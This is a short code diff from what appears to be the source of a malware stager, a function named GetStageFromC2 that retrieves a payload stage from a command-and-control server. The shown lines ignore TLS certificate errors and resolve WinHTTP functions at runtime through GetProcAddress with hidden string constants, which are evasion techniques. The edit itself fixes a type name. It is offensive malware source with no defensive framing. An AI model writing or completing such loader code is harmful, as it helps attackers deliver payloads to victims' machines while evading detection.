@@ -27,7 +27,7 @@ CHAR* GetStageFromC2(DWORD* sSize)
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
     // get out close handle export
-    WinHttpCloseHandle rWinHttpCloseHandle = (WinHttpCloseHandle)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CLOSEH);
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CLOSEH);
 
     // init the connection
     WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPEN);
